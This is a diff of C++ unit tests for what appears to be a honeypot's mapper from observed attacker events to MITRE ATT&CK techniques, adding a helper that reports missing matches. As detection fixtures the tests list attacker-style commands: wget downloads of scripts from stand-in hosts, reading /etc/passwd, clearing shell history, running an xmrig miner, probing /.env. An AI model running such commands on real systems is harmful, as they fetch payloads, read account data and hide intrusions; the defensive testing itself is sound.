@@ -3,13 +3,23 @@
 #include <gtest/gtest.h>
 
 #include <string>
+#include <string_view>
 
 namespace {
 
 using arapuca::core::EventType;
-using arapuca::enrich::MatchKind;
 using arapuca::enrich::MitreError;
 using arapuca::enrich::MitreMapper;
+
+/// Technique for a subject, or a readable marker when nothing matched.
+///
+/// Dereferencing the optional directly would make a missing match crash the
+/// test binary instead of failing the assertion, which hides which case broke.
+std::string technique_of(const MitreMapper& mapper, EventType type, std::string_view subject) {
+    const auto result = mapper.match(type, subject);
+    EXPECT_TRUE(result.has_value()) << "no rule matched: " << subject;
+    return result.value_or(arapuca::core::Mitre{"<no match>", "", ""}).technique_id;
+}
 
 MitreMapper small() {
     return MitreMapper::from_yaml(R"(
@@ -48,8 +58,12 @@ TEST(MitreMapper, LoadsRules) {
 TEST(MitreMapper, MatchesACommand) {
     const auto result = small().match(EventType::SshCommand, "wget http://example.com/x.sh");
     ASSERT_TRUE(result.has_value());
-    EXPECT_EQ("T1105", result->technique_id);
-    EXPECT_EQ("Command and Control", result->tactic);
+    // value_or rather than operator-> or value(): the optional access check
+    // cannot follow the early return inside ASSERT_TRUE, and a default
+    // constructed Mitre fails the comparisons below just as clearly.
+    const auto mitre = result.value_or(arapuca::core::Mitre{});
+    EXPECT_EQ("T1105", mitre.technique_id);
+    EXPECT_EQ("Command and Control", mitre.tactic);
 }
 
 TEST(MitreMapper, EventTypeIsPartOfTheMatch) {
@@ -72,7 +86,7 @@ rules:
 )");
     const auto result = mapper.match(EventType::SshCommand, "./xmrig --donate 0");
     ASSERT_TRUE(result.has_value());
-    EXPECT_EQ("T1496", result->technique_id);
+    EXPECT_EQ("T1496", result.value_or(arapuca::core::Mitre{}).technique_id);
 }
 
 TEST(MitreMapper, NoMatchIsNormal) {
@@ -110,9 +124,9 @@ rules:
     match: equals
     pattern: "exit"
 )");
-    EXPECT_EQ("T1000", mapper.match(EventType::SshCommand, "sudo su -")->technique_id);
+    EXPECT_EQ("T1000", technique_of(mapper, EventType::SshCommand, "sudo su -"));
     EXPECT_FALSE(mapper.match(EventType::SshCommand, "echo sudo ").has_value());
-    EXPECT_EQ("T2000", mapper.match(EventType::SshCommand, "exit")->technique_id);
+    EXPECT_EQ("T2000", technique_of(mapper, EventType::SshCommand, "exit"));
     EXPECT_FALSE(mapper.match(EventType::SshCommand, "exit 0").has_value());
 }
 
@@ -190,19 +204,18 @@ TEST(MitreMapper, ShippedRulesFileLoadsAndCoversTheSeedTechniques) {
     const auto mapper = MitreMapper::from_file(std::string(ARAPUCA_CONFIG_DIR) + "/mitre.yaml");
     EXPECT_GT(mapper.size(), 15U);
 
-    EXPECT_EQ("T1110", mapper.match(EventType::SshAuthAttempt, "root")->technique_id);
-    EXPECT_EQ(
-        "T1105",
-        mapper.match(EventType::SshCommand, "cd /tmp; wget http://1.2.3.4/bot")->technique_id);
-    EXPECT_EQ("T1082", mapper.match(EventType::SshCommand, "uname -a")->technique_id);
-    EXPECT_EQ("T1087.001", mapper.match(EventType::SshCommand, "whoami")->technique_id);
-    EXPECT_EQ("T1070.003", mapper.match(EventType::SshCommand, "history -c")->technique_id);
-    EXPECT_EQ("T1053.003", mapper.match(EventType::SshCommand, "crontab -l")->technique_id);
-    EXPECT_EQ("T1046", mapper.match(EventType::SshCommand, "netstat -antp")->technique_id);
-    EXPECT_EQ("T1496", mapper.match(EventType::SshCommand, "./xmrig -o pool")->technique_id);
-    EXPECT_EQ("T1003.008", mapper.match(EventType::SshCommand, "cat /etc/passwd")->technique_id);
-    EXPECT_EQ("T1552.001", mapper.match(EventType::HttpRequest, "/.env")->technique_id);
-    EXPECT_EQ("T1021.004", mapper.match(EventType::SshChannelDenied, "direct-tcpip")->technique_id);
+    EXPECT_EQ("T1110", technique_of(mapper, EventType::SshAuthAttempt, "root"));
+    EXPECT_EQ("T1105",
+              technique_of(mapper, EventType::SshCommand, "cd /tmp; wget http://1.2.3.4/bot"));
+    EXPECT_EQ("T1082", technique_of(mapper, EventType::SshCommand, "uname -a"));
+    EXPECT_EQ("T1087.001", technique_of(mapper, EventType::SshCommand, "whoami"));
+    EXPECT_EQ("T1070.003", technique_of(mapper, EventType::SshCommand, "history -c"));
+    EXPECT_EQ("T1053.003", technique_of(mapper, EventType::SshCommand, "crontab -l"));
+    EXPECT_EQ("T1046", technique_of(mapper, EventType::SshCommand, "netstat -antp"));
+    EXPECT_EQ("T1496", technique_of(mapper, EventType::SshCommand, "./xmrig -o pool"));
+    EXPECT_EQ("T1003.008", technique_of(mapper, EventType::SshCommand, "cat /etc/passwd"));
+    EXPECT_EQ("T1552.001", technique_of(mapper, EventType::HttpRequest, "/.env"));
+    EXPECT_EQ("T1021.004", technique_of(mapper, EventType::SshChannelDenied, "direct-tcpip"));
 }
 
 }  // namespace
